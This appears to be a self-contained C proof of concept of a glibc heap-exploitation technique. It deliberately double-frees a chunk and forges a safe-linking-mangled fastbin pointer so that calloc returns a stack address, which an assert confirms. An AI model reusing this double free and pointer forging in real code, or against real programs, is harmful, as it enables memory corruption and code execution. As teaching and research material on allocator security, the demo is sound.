
#include <stdlib.h>
#include <assert.h>
int main()
{
	void *ptrs[7];
	for (int i = 0; i < 7; i++) {
		ptrs[i] = malloc(8);
	}
	for (int i = 0; i < 7; i++) {
		free(ptrs[i]);
	}
	unsigned long stack_var[2] __attribute__((aligned(0x10)));
	int *a = calloc(1, 8);
	int *b = calloc(1, 8);
	int *c = calloc(1, 8);
	//First call to free will add a reference to the fastbin
	free(a);
	free(b);
	//Calling free(a) twice renders the program vulnerable to Double Free
	free(a);
	unsigned long *d = calloc(1, 8);
	calloc(1, 8);
	stack_var[1] = 0x20;
	unsigned long ptr = (unsigned long)stack_var;
	unsigned long addr = (unsigned long)d;
	/*VULNERABILITY*/
	*d = (addr >> 12) ^ ptr;
	/*VULNERABILITY*/
	calloc(1, 8);
	void *p = calloc(1, 8);
	assert((unsigned long)p == (unsigned long)stack_var + 0x10);
}
